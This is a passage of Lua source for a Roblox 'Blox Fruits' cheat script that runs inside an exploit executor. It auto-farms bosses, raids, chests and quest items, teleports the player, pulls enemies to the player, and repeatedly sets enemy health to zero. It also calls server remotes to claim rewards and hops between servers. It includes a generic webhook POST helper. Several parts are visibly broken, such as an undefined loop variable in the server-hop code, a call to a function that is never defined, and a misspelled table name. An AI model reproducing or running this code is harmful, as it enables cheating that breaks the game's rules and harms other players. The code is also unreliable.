                    spawn(Tweento(v.Engine.CFrame * CFrame.new(0, -20, 0)), 1)
                    autospamskill = true
                    getgenv().psskill =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -5, 0)
                until not v or not v.Parent or v.Health.Value <= 0 or not CheckPirateBoat()
                getgenv().psskill = nil
                autospamskill = false
            elseif checkseabeast() then
                local v = checkseabeast()
                repeat
                    wait()
                    spawn(TeleportSeabeast(v), 1)
                    autospamskill = true
                    getgenv().psskill =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -5, 0)
                until not v or not v.Parent or v.Health.Value <= 0 or not checkseabeast()
                getgenv().psskill = nil
                autospamskill = false
            end
        end
        while wait() do
            if AutoSeaBeast then
                pcall(
                    function()
                        Stats_Melee = game:GetService("Players").LocalPlayer.Data.Stats.Melee.Level.Value
                    end
                )
                pcall(
                    function()
                        Stats_DF = game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value
                    end
                )
                pcall(
                    function()
                        Stats_Gun = game:GetService("Players").LocalPlayer.Data.Stats.Gun.Level.Value
                    end
                )
                pcall(
                    function()
                        Stats_Sword = game:GetService("Players").LocalPlayer.Data.Stats.Sword.Level.Value
                    end
                )
                if Stats_Melee and Stats_Melee > 1 then
                    ToggleSpamMelee:Set(true)
                end
                if Stats_DF and Stats_DF > 1 then
                    ToggleSpamDF:Set(true)
                end
                if Stats_Sword and Stats_Sword > 1 then
                    ToggleSpamSword:Set(true)
                end
                if Stats_Gun and Stats_Gun > 1 then
                    ToggleSpamGun:Set(true)
                end
                EnableBuso()
                EnableKen()
                local args = {
                    [1] = "BlackbeardReward",
                    [2] = "DragonClaw",
                    [3] = "2"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                repeat
                    wait()
                    pcall(
                        function()
                            Seabeast()
                        end
                    )
                until not AutoSeaBeast
            end
        end
    end
)
function DisableMoveMob(v)
    sizepart(v)
end
function PostWebhook(url, msg)
    local rq = http_request or request or HttpPost or syn.request
    local DataCallBack =
        rq(
        {
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(msg)
        }
    )
    return ""
end
function CheckExploitNgu(ngu2545645)
    local exploitdot = is_fluxus_function and "exploit dot"
    if exploitdot ~= "exploit dot" then
        return isnetworkowner(ngu2545645)
    else
        min = math.huge
        nouwegheruqigheri = ""
        for i, v in pairs(game.Players:GetChildren()) do
            pcall(
                function()
                    if (v.Character.HumanoidRootPart - ngu2545645.Position).Magnitude < min then
                        min = (v.Character.HumanoidRootPart - ngu2545645.Position).Magnitude
                    end
                end
            )
        end
        for i, v in pairs(game.Players:GetChildren()) do
            pcall(
                function()
                    if (v.Character.HumanoidRootPart - ngu2545645.Position).Magnitude <= min then
                        nouwegheruqigheri = v.Name
                    end
                end
            )
        end
        if game.Players.LocalPlayer.Name == nouwegheruqigheri then
            return true
        end
    end
end
function BringMobPossed(mob, cf)
    if cf then
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if
                v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                    CheckExploitNgu(v.HumanoidRootPart) and
                    v.Humanoid.Health > 0
             then
                SizePart(v)
                if (v.HumanoidRootPart.Position - cf.HumanoidRootPart.Position).Magnitude > 5 then
                    v.HumanoidRootPart.CFrame = cf.HumanoidRootPart.CFrame
                end
            end
        end
        return nil
    end
    if mob and mob:FindFirstChild("Humanoid") and mob:FindFirstChild("HumanoidRootPart") and mob.Humanoid.Health > 0 then
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if
                v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                    CheckExploitNgu(v.HumanoidRootPart) and
                    v.Humanoid.Health > 0
             then
                SizePart(v)
                if (v.HumanoidRootPart.Position - mob.HumanoidRootPart.Position).Magnitude > 5 then
                    v.HumanoidRootPart.CFrame = mob.HumanoidRootPart.CFrame
                end
            end
        end
    end
end
function HopLowPlayer()
    local function HopLow()
        svlowlist = {}
        for i = 1, 50 do
            local huhu = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(i)
            for k, v in pairs(huhu) do
                if k ~= game.JobId and v["Count"] <= 5 then
                    svlowlist[k] = v
                end
            end
        end
        for i, v in pairs(svlowlist) do
            if k ~= game.JobId and v["Count"] < 10 and string.find(v["Region"], ChooseRegion) then
                if not Settings2[k] or tick() - Settings2[k].Time > 60 * 10 then
                    Settings2[k] = {
                        Time = tick()
                    }
                    SaveSettings2()
                    Notify("Script Status", "Joining Server ID: " .. k .. "\nRegion: " .. v["Region"], 15)
                    game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", k)
                    return true
                elseif tick() - Settings2[k].Time > 60 * 60 then
                    Settings2[k] = nil
                end
            end
        end
    end
    if not getgenv().Loaded then
        local function child(v)
            if v.Name == "ErrorPrompt" then
                if v.Visible then
                    if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                        HopServer()
                        v.Visible = false
                    end
                end
                v:GetPropertyChangedSignal("Visible"):Connect(
                    function()
                        if v.Visible then
                            if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                HopServer()
                                v.Visible = false
                            end
                        end
                    end
                )
            end
        end
        for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
            child(v)
        end
        game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(child)
        getgenv().Loaded = true
    end
    while not Hop() do
        wait()
    end
    SaveSettings2()
end
MobsCakePrince = {
    "Cookie Crafter [Lv. 2200]",
    "Cake Guard [Lv. 2225]",
    "Baking Staff [Lv. 2250]",
    "Head Baker [Lv. 2275]"
}
MobsCakePrinceSpawns = {}
if string.find(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()[1].Name, "Lv.") then
    MobsCakePrinceSpawns = MobsCakePrince
    wait()
else
    for i, v in pairs(MobsCakePrince) do
        MobsCakePrinceSpawns[i] = tostring(v:gsub(" %pLv. %d+%p", ""))
    end
end
function getCakePrinceMobs()
    for i, v in next, game.workspace.Enemies:GetChildren() do
        if
            v:IsA("Model") and table.find(MobsCakePrince, v.Name) and v:FindFirstChild("HumanoidRootPart") and
                v:FindFirstChild("Humanoid") and
                v.Humanoid.Health > 0
         then
            return v.Name
        end
    end
end
CakePrinceBosses = {
    "Dough King [Lv. 2300] [Raid Boss]",
    "Cake Prince [Lv. 2300] [Raid Boss]"
}
function getCakePrince()
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if
            table.find(CakePrinceBosses, v.Name) and v:FindFirstChild("Humanoid") and
                v:FindFirstChild("HumanoidRootPart") and
                v.Humanoid.Health > 0
         then
            return v
        end
    end
    for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if
            table.find(CakePrinceBosses, v.Name) and v:FindFirstChild("Humanoid") and
                v:FindFirstChild("HumanoidRootPart") and
                v.Humanoid.Health > 0
         then
            return v
        end
    end
end
RandomCFrame = CFrame.new(0, 30, 0)
spawn(
    function()
        while wait() do
            wait()
            pcall(
                function()
                    if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
                        RandomCFrameChoices = {
                            CFrame.new(15, 30, 20),
                            CFrame.new(-20, 30, -15),
                            CFrame.new(0, 30, 20),
                            CFrame.new(0, 30, -20)
                        }
                        RandomCFrameIndex = math.random(0, #RandomCFrameChoice)
                        RandomCFrameChoice = RandomCFrameChoices[RandomCFrameIndex]
                        RandomCFrame = RandomCFrameChoice
                        wait(.5)
                    end
                end
            )
        end
    end
)
BoneMobs = {
    "Reborn Skeleton [Lv. 1975]",
    "Living Zombie [Lv. 2000]",
    "Demonic Soul [Lv. 2025]",
    "Posessed Mummy [Lv. 2050]"
}
BoneMobsSpawns = {}
if string.find(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()[1].Name, "Lv.") then
    ----print("Nothing happend")
    BoneMobsSpawns = BoneMobs
else
    ----print("happed")
    for i, v in pairs(BoneMobs) do
        BoneMobsSpawns[i] = tostring(v:gsub(" %pLv. %d+%p", ""))
    end
end
function getBoneMob()
    for i, v in next, game.workspace.Enemies:GetChildren() do
        if
            v:IsA("Model") and table.find(BoneMobs, v.Name) and v:FindFirstChild("HumanoidRootPart") and
                v.Humanoid.Health > 0
         then
            return v
        end
    end
end
blnamequest = {}
getgenv().QuestKillPlayer = false
function doorcup()
    return workspace.Map.Desert.Burn.Part.CanCollide == false
end
function doorsaber()
    for i, v in next, game:GetService("Workspace").Map.Jungle.Final:GetChildren() do
        if v:IsA("Part") and not v.CanCollide then
            return true
        end
    end
end
spawn(function()
    while task.wait() do 
        pcall(function() LocalPlayerLevelValue = game.Players.LocalPlayer.Data.Level.Value end)
        pcall(function() LocalPlayerBeliValue = game.Players.LocalPlayer.Data.Beli.Value end)
        pcall(function() LocalPlayerFragmentValue = game.Players.LocalPlayer.Data.Fragments.Value end)
        task.wait()
    end
end)
function IsIslandRaid(nu)
    if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island " .. nu) then
        min = 4500
        for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
            if
                v.Name == "Island " .. nu and
                    (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < min
             then
                min = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            end
        end
        for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
            if
                v.Name == "Island " .. nu and
                    (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= min
             then
                return v
            end
        end
    end
end
function getNextIsland()
    TableIslandsRaid = {
        5,
        4,
        3,
        2,
        1
    }
    for i, v in pairs(TableIslandsRaid) do
        if
            IsIslandRaid(v) and
                (IsIslandRaid(v).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                    4500
         then
            return IsIslandRaid(v)
        end
    end
end
function CheckIsRaiding()
    checkraid1 = game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible == true 
    checkraid2 = getNextIsland()
    if checkraid1 then return checkraid1 end 
    return checkraid2
end
spawn(function()
    while task.wait() do
        if (Sea2 or Sea3) and Settings["Auto Raid"] and CheckIsRaiding() then 
            repeat wait()
                pcall(function()
                    if getNextIsland() then 
                        spawn(Tweento(getNextIsland().CFrame * CFrame.new(0,60,0)),1)
                    end
                    spawn(function()
                        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do 
                            if v:FindFirstChild("Humanoid") then 
                                spawn(function()
                                    repeat 
                                        v.Humanoid.Health = 0 
                                        task.wait()
                                    until not v or not v:FindFirstChild("Humanoid") or v.Humanoid.Health == 0 
                                end)
                            end
                        end
                    end)
                end)
            until not Settings["Auto Raid"] or not CheckIsRaiding()
            if tween then tween:Cancel() end 
            wait(10)
        elseif (Sea2 or Sea3) and Settings["Auto Raid"] then 
            if AnyDFInBackpack() then 
                BoughtChip = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", Settings["ChoosenRaid"]) == 1
                --[[
                BaKhiaNguNhuCho = AnyDFInBackpack()
                if BaKhiaNguNhuCho:FindFirstChild("Coone") or BaKhiaNguNhuCho:FindFirstChild("Raid Client") then 
                    
                else
                    pcall(function()
                        StoreDFInPath(game.Players.LocalPlayer.Backpack)
                    end)
                    pcall(function()
                        StoreDFInPath(game.Players.LocalPlayer.Character)
                    end)
                end
                ]]
                task.wait(20)
            else
                pcall(function() if Settings["Auto Get Fruit 1M"] then AutoGetFruitBelow1M() end end) 
            end
        end
    end
end)
function CheckColorRipIndra()
    conchodonand = {}
    for i,v in next,game:GetService("Workspace").Map["Boat Castle"].Summoner.Circle:GetChildren() do
        if v:IsA("Part") and v:FindFirstChild("Part") and v.Part.BrickColor.Name == "Dark stone grey" then
            conchodonand[v.BrickColor.Name] = v
        end
    end
    return conchodonand
end
function CheckColorHas()
    ColorsHas = {}
    for i,v in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do 
        if v["Unlocked"] then 
            ColorsHas[v.HiddenName] = v 
        end
    end
    return ColorsHas 
end
function CheckDoneColor()
    for i,v in next,game:GetService("Workspace").Map["Boat Castle"].Summoner.Circle:GetChildren() do
        if v:IsA("Part") and v:FindFirstChild("Part") and v.Part.BrickColor.Name == "Dark stone grey" then
            return false
        end
    end
    return true
end
spawn(function()
    while task.wait() do 
        AVGBaKhia = CheckColorHas()
        task.wait(15)
    end
end)
function ActivateColor(ColorName) 
    concho = {
        ["Hot pink"] = "Winter Sky",
        ["Really red"] = "Pure Red",
        ["Oyster"] = "Snow White"
    }
    conchogg = concho[ColorName]
    if not AVGBaKhia[conchogg] then return end
    if conchogg then 
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("activateColor",conchogg)
    end
    return true
end
function AutoActiveColorRip_Indra()
    for i,v in pairs(CheckColorRipIndra()) do 
        sos = ActivateColor(i)
        if sos then 
            Tweento(v.CFrame)
            firetouchinterest(v.TouchInterest,game.Players.LocalPlayer.Character.HumanoidRootPart,0)
            firetouchinterest(v.TouchInterest,game.Players.LocalPlayer.Character.HumanoidRootPart,1)
        end
    end
end
Elites = {
    "Deandre [Lv. 1750]",
    "Urban [Lv. 1750]",
    "Diablo [Lv. 1750]"
}
function CheckElite()
    return CheckMob(Elites,true)
end
function KillMobReal(Mobbbbbb) 
    k = Mobbbbbb 
    if game.Workspace.Enemies:FindFirstChild(k.Name) and k:FindFirstChild("Humanoid") and k:FindFirstChild("HumanoidRootPart") and k.Humanoid.Health > 0 then 
        repeat
            spawn(EnableBuso(),1)
            spawn(EquipWeapon(),1)
            spawn(Tweento(k.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1)
            NoClip = true 
            UseFastAttack = true 
        until not k or not k:FindFirstChild("Humanoid") or not k:FindFirstChild("HumanoidRootPart") or k.Humanoid.Health <= 0 
        UseFastAttack = false 
    end
end
function CheckMobPirateRaid()
    for i, v in pairs(game.workspace.Enemies:GetChildren()) do
        pcall(pcall(function()
            if not string.find(v.Name,"Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health >0 and v:FindFirstChild("HumanoidRootPart") and (v.HumanoidRootPart.Position - Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 1000 and not string.find(v.Name, "Boss") and not string.find(v.Name, "Friend") then 
                return v 
            end
        end))
    end
end
function GetInfoBossQuest(bossquest)
    returnrnrnr = {}
    for i,v in next,require(game:GetService("ReplicatedStorage").Quests) do
        for i1,v1 in next,v do
            if v1.LevelReq <= LocalPlayerLevelValue and v1.Name == bossquest then
                returnrnrnr["QuestName"] = i 
                returnrnrnr["QuestId"] = i1
                return returnrnrnr
            end
        end
    end
end
function CheckQuestBoss(bossname)
    local x = bossname
    local a 
    local b
    if string.find(x,' %pRaid Boss%p') then
        a = string.gsub(x,"%pLv. %d+%p", "")
        b = string.gsub(a,"  %pRaid Boss%p","")
    else
        a = string.gsub(x,"%pLv. %d+%p", "")
        b = string.gsub(a,"  %pBoss%p","")
    end
    for i,v in next,require(game:GetService("ReplicatedStorage").Quests) do
        for i1,v1 in next,v do
            for i2,v2 in next,v1.Task do
                if i2 == b then
                    return b
                end
            end
        end
    end
end
dagatcanmemay = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor")
MirrorFractal = CheckItem("Mirror Fractal")
Valk = CheckItem("Valkyrie Helm")
function GetFruitInWorkSpace()
    tbbbb = {}
    for i,v in pairs(game.Workspace:GetChildren()) do 
        if string.find(v.Name, "Fruit") and game.Workspace:FindFirstChild(v.Name) then 
            return v
        end
    end
end
function CheckFruitInBackPack()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if string.find(v.Name, "Fruit") and game.Workspace:FindFirstChild(v.Name) then 
            return v
        end
    end
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
        if string.find(v.Name, "Fruit") and game.Workspace:FindFirstChild(v.Name) then 
            return v
        end
    end
end
function CheckEliteSafe()
    if Settings["StopGodChalice"] and CheckTool("God's Chalice") then 
        return true 
    end
end
function CheckTorchTushita()
    local a 
    if not game:GetService("Workspace").Map.Turtle.QuestTorches.Torch1.Particles.Main.Enabled then
        a = "1"
    elseif not game:GetService("Workspace").Map.Turtle.QuestTorches.Torch2.Particles.Main.Enabled then
        a = "2"
    elseif not game:GetService("Workspace").Map.Turtle.QuestTorches.Torch3.Particles.Main.Enabled then
        a = "3"
    elseif not game:GetService("Workspace").Map.Turtle.QuestTorches.Torch4.Particles.Main.Enabled then
        a = "4"
    elseif not game:GetService("Workspace").Map.Turtle.QuestTorches.Torch5.Particles.Main.Enabled then
        a = "5"
    end
    for i,v in next,game:GetService("Workspace").Map.Turtle.QuestTorches:GetChildren() do
        if v:IsA("MeshPart") and  string.find(v.Name, a) and not v.Particles.Main.Enabled then
            return v 
        end
    end
end
local Isvando
function CheckTushita()
    if CheckTushitaGate() and CheckBoss("Longma [Lv. 2000] [Boss]") then
        return true
    elseif not CheckTushitaGate() then
        if CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") then 
            return true 
        end
    elseif not CheckBoss("Longma [Lv. 2000] [Boss]") then 
        if not Isvando or tick()-Isvando >= 50 then 
            Notify("ASAS","Not Found Long Ma...\nWaitting [Long Ma] to get tushita",50)
            Isvando = tick()
        end
    end
end
function AutoTushitaFully()
    if CheckTushitaGate() and CheckBoss("Longma [Lv. 2000] [Boss]") then 
        BaKhiaNgu = CheckBoss("Longma [Lv. 2000] [Boss]")
        if BaKhiaNgu then 
            SelectBoss_Dropdown:Set("Longma [Lv. 2000] [Boss]")
           -- FarmBoss_Toggle:Set(true)
            if game.Workspace.Enemies:FindFirstChild(BaKhiaNgu.Name) then 
                KillMob(BaKhiaNgu)
            else
                spawn(function()
                    Tweento(BaKhiaNgu.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                end)
            end
        else
            --FarmBoss_Toggle:Set(false)
        end
    else
        if CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") then 
            if CheckTool("Holy Torch") then 
                if CheckTorchTushita() then Tweento(CheckTorchTushita().CFrame) end 
            else
                Tweento(game:GetService("Workspace").Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame)
                wait(1)
            end
        end
    end
end
function TweenChest(chet)
    if chet then 
        if (chet.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 20 then 
            game.Players.LocalPlayer.Character.Humanoid.WalkToPoint = chet.Position
        else
            Tweento(chet*CFrame.new(0,0,-3))
        end
    end
end
function CheckFactory()
    return CheckBoss("Core")
end
spawn(
    function()
        local Count_Chest = 0
        while wait() do
            if not Sabered then Sabered = CheckItem("Saber") end
            if not PoleV1ed then PoleV1ed = CheckItem("Pole (1st Form)") end 
            if not Sea2Ed then Sea2Ed = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 end
            if not dagatcanmemay then dagatcanmemay = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") end
            if Settings["Auto Farm Mob Select"] and Settings["Selected Mobs"] then 
                KillMob(Settings["Selected Mobs"],true)
            elseif Settings["Auto Chest"] and GetNearestChest() and not (Settings["Auto Rip_Indra"] and CheckTool("God's Chalice") ) then 
                if Settings["Hop After 15 Chest"] then 
                    if Count_Chest >= 15 and not (CheckTool("God's Chalice") and CheckTool("Fist of Darkness")) then 
                        HopServer()
                    elseif not (CheckTool("God's Chalice") and CheckTool("Fist of Darkness"))  then 
                        if GetNearestChest() then 
                            repeat wait()
                                asasas = GetNearestChest()
                                if asasas then TweenChest(asasas);Count_Chest = Count_Chest + 1;print("Count_Chest",Count_Chest) end
                                asasas = nil
                                wait(0.5)
                            until not asasas or not Settings["Auto Chest"]
                        else 
                            print("not get chest")
                        end
                    elseif CheckTool("God's Chalice") or CheckTool("Fist of Darkness") then
                        if Sea3 then 
                            Tweento(CFrame.new(-12551.0156, 336.26239, -7409.53369, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                        elseif Sea2 then 
                            Tweento(CFrame.new(-385.250916, 73.0458984, 297.388397))
                        end
                    end
                else
                    if not (CheckTool("God's Chalice") and CheckTool("Fist of Darkness"))  then 
                        if GetNearestChest() then 
                            repeat wait()
                                asasas = GetNearestChest()
                                if asasas then TweenChest(asasas);Count_Chest = Count_Chest + 1;print("Count_Chest",Count_Chest) end
                                asasas = nil
                                wait(0.5)
                            until not asasas or not Settings["Auto Chest"]
                        else 
                            print("not get chest")
                        end
                    elseif CheckTool("God's Chalice") or CheckTool("Fist of Darkness") then
                        if Sea3 then 
                            Tweento(CFrame.new(-12551.0156, 336.26239, -7409.53369, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                        elseif Sea2 then 
                            Tweento(CFrame.new(-385.250916, 73.0458984, 297.388397))
                        end
                    end
                end
            elseif Sea3 and Settings["Auto Tushita"] and CheckTushita() then 
                AutoTushitaFully()
            elseif Sea3 and Settings["Auto Rip_Indra"] and (CheckTool("God's Chalice") or CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]")) then 
                if CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") then 
                    BaKhia = CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]")
                    if BaKhia then 
                        spawn(function()
                            Tweento(BaKhia.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end)
                        if game.Workspace.Enemies:FindFirstChild(BaKhia.Name) then 
                            KillMob(BaKhia)
                        end
                    end
                elseif not CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") then 
                    if CheckTool("God's Chalice") then 
                        if CheckDoneColor() then 
                            EquipWeaponName("God's Chalice")
                            Tweento(game:GetService("Workspace").Map["Boat Castle"].Summoner.Detection.CFrame)
                            wait(1)
                        else
                            AutoActiveColorRip_Indra()
                        end
                    end
                end
            elseif Sea3 and Settings["AutoPullLever"] and not dagatcanmemay and IsMirageIsland2() then  
                if CheckSea(3) then
                    if not MirrorFractal then MirrorFractal = CheckItem("Mirror Fractal") end 
                    if not Valk then Valk = CheckItem("Valkyrie Helm") end
                    if Valk and MirrorFractal then 
                        local v213 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Check")
                    if v213 == 1 then
                        Notify("Script Status", "Begin", 10)
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Begin")
                    elseif v213 == 2 then
                        Notify("Script Status", "Conitnue Time 1", 10)
                        TweenTempleLegit()
                    elseif v213 == 3 then
                        Notify("Script Status", "Continue Time 2", 10)
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Continue")
                    elseif not DaGatCan and
                        not game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") and
                            IsMirageIsland2()
                     then
                        if getBlueGear() then
                            pcall(
                                function()
                                    HighestPointRealCFrame = getHighestPoint().CFrame * CFrame.new(0, 211.88, 0)
                                end
                            )
                            BlueGear = getBlueGear()
                            if BlueGear and not BlueGear.CanCollide and BlueGear.Transparency ~= 1 then
                                repeat
                                    wait()
                                    TweentoBlueGear()
                                until not getBlueGear() or getBlueGear().Transparency == 1
                                if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then 
                                    DaGatCan = true
                                    MoveCamTooMoonToggle:Set(false)
                                    AutoPullLever:Set(false)
                                end
                            elseif BlueGear and BlueGear.Transparency == 1 then
                                if
                                    HighestPointRealCFrame and
                                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                                            HighestPointRealCFrame.Position).Magnitude > 10
                                 then
                                    Tweento(HighestPointRealCFrame)
                                elseif
                                    HighestPointRealCFrame and
                                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                                            HighestPointRealCFrame.Position).Magnitude <= 10
                                 then
                                    MoveCamTooMoonToggle:Set(true)
                                    wait(.1)
                                    game:service("VirtualInputManager"):SendKeyEvent(true, "T", false, game)
                                    task.wait()
                                    game:service("VirtualInputManager"):SendKeyEvent(false, "T", false, game)
                                    task.wait(1.5)
                                end
                            end
                        end
                    end
                    elseif DaGatCan then 
                        PullLever()
                    end
                else
                    wait()
                end
            elseif Settings["Auto Find Fruit"] and not CheckTool("Special Microchip") and not CheckIsRaiding() and not CheckFruitInBackPack() and (GetFruitInWorkSpace() or Settings["HopOption"]) then 
                print('Raid ko')
                F1 = GetFruitInWorkSpace()
                if F1 then 
                    repeat wait()
                        if game.Workspace:FindFirstChild(F1.Name)then Tweento(F1.Handle.CFrame) end
                    until not GetFruitInWorkSpace() or not F1 or not F1:FindFirstChild("Handle") and not game.Workspace:FindFirstChild(F1.Name) or not Settings["Auto Find Fruit"]  or CheckTool(F1.Name)
                elseif not GetFruitInWorkSpace() and not CheckTool("Special Microchip") and not CheckFruitInBackPack() and not CheckIsRaiding() and Settings["Auto Find Fruit"] and Settings["HopOption"] then 
                    wait(3)
                    if not GetFruitInWorkSpace() and not CheckTool("Special Microchip") and not CheckFruitInBackPack() and not CheckIsRaiding() and Settings["Auto Find Fruit"] and Settings["HopOption"] then 
                        HopServer()
                    end
                end
            elseif Sea1 and Settings["Auto Pole V1"] and (LocalPlayerLevelValue >= 150 and CheckBoss("Thunder God [Lv. 575] [Boss]")) then 
                if LocalPlayerLevelValue >= 150 then
                    if CheckItem("Pole (1st Form)") then 
                        pcall(function() AutoPoleV1_Toggle:Set(false) end)
                    end
                    if CheckBoss("Thunder God [Lv. 575] [Boss]") then 
                        Target = CheckBoss("Thunder God [Lv. 575] [Boss]")
                        if game.Workspace.Enemies:FindFirstChild(Target.Name) then 
                            repeat 
                                EquipWeapon()
                                EnableBuso()
                                Tweento(Target.HumanoidRootPart.CFrame *CFrame.new(0,40,0))
                                UseFastAttack = true
                            until not Target or not Target:FindFirstChild("Humanoid") or not Target:FindFirstChild("HumanoidRootPart") and Target.Humanoid.Health <= 0 
                            UseFastAttack = false
                        elseif Target then 
                            EquipWeapon()
                            EnableBuso()
                            spawn(Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1)
                            NoClip = true
                        end
                    end
                end
            elseif Sea1 and Settings["Auto Saber"] and not Sabered and LocalPlayerLevelValue >= 200 then 
                pcall(function()
                    if LocalPlayerLevelValue >= 200 then
                        if CheckItem("Saber") then
                            AutoSaber_Toggle:Set(false)
                        end
                        if not doorsaber() then
                            if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.CanCollide then
                                
                                if DoorTouch() then 
                                    pcall(function()
                                        Tweento(DoorTouch().Button.CFrame)
                                    end)
                                end
                                
                            else
                                if doorcup() then
                                    
                                    if
                                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= 0 and
                                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= 1
                                     then
                                        print("nung 0")
                                        if
                                            not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") and
                                                not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup")
                                         then
                                            if (game:GetService("Workspace").Map.Desert.Cup.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 3 then 
                                                firetouchinterest(game:GetService("Workspace").Map.Desert.Cup, game.Players.LocalPlayer.Character.HumanoidRootPart, 0)
                                                firetouchinterest(game:GetService("Workspace").Map.Desert.Cup, game.Players.LocalPlayer.Character.HumanoidRootPart, 1)
                                            else
                                                Tweento(game:GetService("Workspace").Map.Desert.Cup.CFrame)
                                            end
                                        elseif game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup") then
                                            print("lon cho ngu")
                                            EquipWeaponName("Cup")
                                            if
                                                game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup") and
                                                    game:GetService("Players").LocalPlayer.Backpack.Cup.Handle:FindFirstChild(
                                                        "TouchInterest"
                                                    ) or
                                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") and
                                                        game:GetService("Players").LocalPlayer.Character.Cup.Handle:FindFirstChild(
                                                            "TouchInterest"
                                                        )
                                             then
                                                Tweento(CFrame.new(
                                                    1395.77307,
                                                    37.4733238,
                                                    -1324.34631,
                                                    -0.999978602,
                                                    -6.53588605e-09,
                                                    0.00654155109,
                                                    -6.57083277e-09,
                                                    1,
                                                    -5.32077493e-09,
                                                    -0.00654155109,
                                                    -5.3636442e-09,
                                                    -0.999978602
                                                ))
                                            elseif
                                                game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup") and
                                                    not game:GetService("Players").LocalPlayer.Backpack.Cup.Handle:FindFirstChild(
                                                        "TouchInterest"
                                                    ) or
                                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") and
                                                        not game:GetService("Players").LocalPlayer.Character.Cup.Handle:FindFirstChild(
                                                            "TouchInterest"
                                                        )
                                             then
                                                if
                                                    (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                                        Vector3.new(1457.8768310547, 88.377502441406, -1390.6892089844)).Magnitude > 8
                                                 then
                                                    toTarget(
                                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                                        CFrame.new(1457.8768310547, 88.377502441406, -1390.6892089844).Position,
                                                        CFrame.new(1457.8768310547, 88.377502441406, -1390.6892089844)
                                                    )
                                                else
                                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                                                        "ProQuestProgress",
                                                        "SickMan"
